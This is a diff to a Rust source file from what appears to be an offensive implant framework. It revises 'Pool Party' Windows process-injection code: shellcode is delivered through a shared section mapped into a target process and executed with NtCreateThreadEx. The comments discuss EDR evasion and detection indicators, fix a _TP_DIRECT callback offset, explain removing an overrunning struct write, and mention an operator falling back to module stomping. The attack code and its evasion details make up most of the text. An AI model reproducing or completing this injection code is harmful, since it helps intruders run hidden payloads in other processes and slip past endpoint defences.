@@ -1,25 +1,35 @@
-//! ThreadPool (Pool Party) injection primitives — research-grade.
+//! ThreadPool (Pool Party) injection primitives — research-grade, PARTIAL.
 //!
-//! ## The technique (SafeBreach Pool Party class)
+//! ⚠ HONESTY NOTE (P0-5): only the *payload delivery* half of Pool Party is
+//! implemented here. Execution does NOT go through the threadless thread-pool
+//! scheduler dispatch; it falls back to `NtCreateThreadEx`. That means the
+//! classic remote-thread IOC **IS present**. Do NOT assume this path is
+//! threadless or stealthy against EDR that keys on remote-thread creation.
 //!
-//! Pool Party abuses the Windows Thread Pool (`ntdll!TppWorkerThread` + the
-//! undocumented `_TP_WORK` / `_TP_DIRECT` structures) to deliver shellcode
-//! without the classic IOCs (`VirtualAllocEx` / `WriteProcessMemory` /
-//! `CreateRemoteThread`). The flow:
+//! ## What IS implemented
+//!
+//! Section-backed payload delivery (the "no `VirtualAllocEx` /
+//! `WriteProcessMemory`" half):
 //!
 //! 1. `NtCreateSection` a page-file-backed section large enough for shellcode.
 //! 2. `NtMapViewOfSection` it into BOTH the implant (writer) and the target
 //!    process (reader) — copy-on-write gives each a private view.
 //! 3. Write the shellcode into the LOCAL view (no `WriteProcessMemory`).
-//! 4. Locate the target's existing thread pool worker thread (via
-//!    `NtQueryInformationThread` walking for `TppWorkerThread` start addresses,
-//!    or by spawning a sacrificial process that has a known TP).
-//! 5. Manipulate the worker's `_TP_DIRECT` structure so its callback pointer
-//!    redirects to the section-mapped shellcode, OR insert a crafted `_TP_WORK`
-//!    into the worker's queue whose `Direct` pointer leads to the shellcode.
-//! 6. The thread pool scheduler dispatches the work → executes shellcode from
-//!    the section view → no `VirtualAllocEx` / `WriteProcessMemory` /
-//!    `CreateRemoteThread` ever fired.
+//!
+//! ## What is NOT implemented (the threadless half)
+//!
+//! The true SafeBreach Pool Party execution path — discovering a target
+//! thread-pool worker (`ntdll!TppWorkerThread`), resolving its `_TP_POOL` /
+//! `_TP_WORK` queue head, crafting a `_TP_DIRECT` whose callback redirects to
+//! the section-mapped shellcode, and splicing a fake `_TP_WORK` into the
+//! worker's queue so the *scheduler* (not a remote thread) dispatches it — is
+//! **NOT yet implemented**. The per-build `_TP_WORK` / `_TP_DIRECT` offsets
+//! need real-machine validation (deferred to P5-final).
+//!
+//! Instead, execution today is `NtCreateThreadEx(target, section_view)`:
+//! the payload *was* delivered via shared section (no cross-process writes),
+//! but it *runs* on a freshly created remote thread. That is a remote-thread
+//! IOC. Calling this "threadless" or "0-of-3 FND" is incorrect.
 //!
 //! ## Research-grade honesty
 //!
@@ -316,28 +326,25 @@ pub unsafe fn pool_party_inject(
     //       NtQueryInformationThread on the worker, or by scanning the
     //       worker's stack for the pool pointer).
     //   (c) Crafting a `_TP_DIRECT` in the section view whose `callback`
-    //       field (offset 0x08) points at `target_base` (the shellcode).
+    //       field (offset 0x10) points at `target_base` (the shellcode).
     //   (d) Inserting a fake `_TP_WORK` whose `direct` field points at the
     //       crafted `_TP_DIRECT` into the worker's queue.
     //
-    // The scaffold below allocates the `_TP_DIRECT` in the section view and
-    // writes the callback redirect — steps (a)/(b)/(d) need a real target to
-    // validate the queue-splice mechanics and are left as the validation
-    // surface. The operator enables Pool Party only after validating on a
-    // known-good target; on failure here the caller degrades to module_stomp.
+    // Steps (a)/(b)/(d) need a real target to validate the queue-splice
+    // mechanics and are left as the validation surface. The operator enables
+    // Pool Party only after validating on a known-good target; on failure here
+    // the caller degrades to module_stomp.
     //
-    // Allocate a TpDirect at the END of the LOCAL section view (past the
-    // shellcode). CRITICAL: must use local_base (implant's view), NOT
-    // target_base (target's view) — writing through target_base from the
-    // implant process would access unmapped memory → STATUS_ACCESS_VIOLATION.
-    let direct_addr = unsafe { (local_base as *mut u8).add(shellcode.len()) };
-    let direct_view: *mut TpDirect = direct_addr as *mut TpDirect;
-    // SAFETY: direct_view points at writable section memory past the shellcode.
-    unsafe {
-        (*direct_view).type_tag = 0x5444_4952_4543_5450; // 'TPDIRECT' tag (placeholder)
-        (*direct_view).fn_table = 0;
-        (*direct_view).callback = target_base as usize; // redirect to shellcode
-    }
+    // NOTE: an earlier revision wrote a `_TP_DIRECT` struct into the LOCAL
+    // section view at `local_base + shellcode.len()` here. That write was dead
+    // code — execution goes through `NtCreateThreadEx(target_base)` below, and
+    // no worker thread dereferences the struct (the queue-splice that WOULD
+    // consume it is unimplemented). Worse, the section is only page-rounded
+    // (4096-byte), so when `shellcode.len()` lands in the top 24 bytes of a
+    // page (e.g. 4073..=4096) the 24-byte struct write runs past the mapped
+    // view → STATUS_ACCESS_VIOLATION. The write has been removed; it should be
+    // reinstated together with the worker-queue splice, sizing the section
+    // with `+ core::mem::size_of::<TpDirect>()` slack at that point.
 
     // ---- 6. Execute via section-backed remote thread ----
     // The section already holds the shellcode in the target's address space.
